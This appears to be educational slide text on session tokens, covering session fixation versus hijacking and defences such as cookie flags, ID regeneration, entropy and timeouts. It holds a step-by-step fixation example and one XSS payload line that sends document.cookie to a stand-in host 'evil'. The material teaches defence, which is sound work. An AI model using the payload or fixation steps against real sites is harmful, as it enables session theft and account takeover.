WHAT'S IN A SESSION TOKEN
Set-Cookie: sessionId=a3f9c8b2e701d4…
  HttpOnly; Secure; SameSite=Strict;
  Path=/; Max-Age=3600
HttpOnly = JS can't read it (blocks XSS theft).
Secure = HTTPS only.
SameSite=Strict = blocks CSRF.
Max-Age = expires after 1 hour.
SESSION TOKEN = IDENTITY PROOF:

Server trusts whoever holds the token.

SESSION LAYER L5
SESSION FIXATION — FORCE A KNOWN ID
FIXATION ATTACK
ATTACKER SETS SESSION ID BEFORE VICTIM LOGS IN
FIXATION ATTACK — STEP BY STEP
1
Attacker visits site, gets session ID: ATTK123. Session is unauthenticated.
2
Attacker crafts a link with that ID forced in:
https://bank.com/login?sid=ATTK123
3
Victim clicks link, logs in successfully. Server authenticates session ATTK123.
4
Attacker already knows ATTK123 — it's now authenticated. Sends it. Server lets them in.
HIJACKING
Steal session after login.
Requires intercepting traffic or XSS.
FIXATION
Plant session ID before login.
Requires victim to follow crafted link.
THE FIX — REGENERATE SESSION ID ON LOGIN
When a user successfully authenticates, the server must invalidate the old session ID and issue a brand new one. The attacker's pre-planted ID becomes worthless the moment the victim logs in.
REGEN ON AUTH INVALIDATE OLD ID
FIXATION DEFENCE:
Regenerate session ID on every login.
Never accept session IDs from URL parameters.

HIGH-ENTROPY SESSION IDs
Must be at least 128 bits of entropy (cryptographically random). Predictable IDs (sequential numbers, user ID hashes) can be guessed. Use CSPRNG — never Math.random().
128-BIT MIN CSPRNG
SHORT SESSION LIFETIMES
Idle timeout (15–30 min) + absolute timeout (8–24 hrs). A stolen token expires quickly. Invalidate server-side on logout — don't just delete the client cookie.
IDLE TIMEOUT SERVER-SIDE INVALIDATE
SECURE COOKIE FLAGS
Deploy all four: HttpOnly (no JS access), Secure (HTTPS only), SameSite=Strict (no CSRF), and a short Max-Age. Missing even one flag is a vulnerability.
HttpOnly Secure SameSite=Strict
OWASP TOP 10 — BROKEN AUTH
Session management failures appear in OWASP A07:2021 (Identification & Auth Failures). Includes: weak session IDs, no logout invalidation, no re-auth for sensitive ops, missing cookie flags.

HOW THIS LOOKS IN PRACTICE
🔬 WIRESHARK — COOKIE IN PLAINTEXT (HTTP)
GET /dashboard HTTP/1.1
Host: bank.example.com
Cookie: sessionId=a3f9c8b2e701d4f3
Accept: text/html
Connection: keep-alive
On HTTP (port 80): the full cookie is visible to anyone on the same network. This is why HTTPS is non-negotiable for session tokens.
⚔️ ATTACK TOOLS THAT TARGET SESSIONS
🦊
Firesheep (2010)
Firefox plugin that sniffed session cookies on open Wi-Fi. Forced the industry to adopt HTTPS everywhere.
🐝
Burp Suite — Repeater
Intercept a request with a valid cookie, modify it, replay it. Standard session testing tool for pentesters.
🕷️
XSS + document.cookie
Inject fetch('https://evil/?c='+document.cookie) via stored XSS. Exfiltrates cookie silently. Stopped by HttpOnly flag.
🎓 COMPLETE CHEAT SHEET

📌 Fixation: plant before login (URL/form).
🔒 HttpOnly+Secure+SameSite = basic hygiene.
🔄 Regen on login kills fixation.
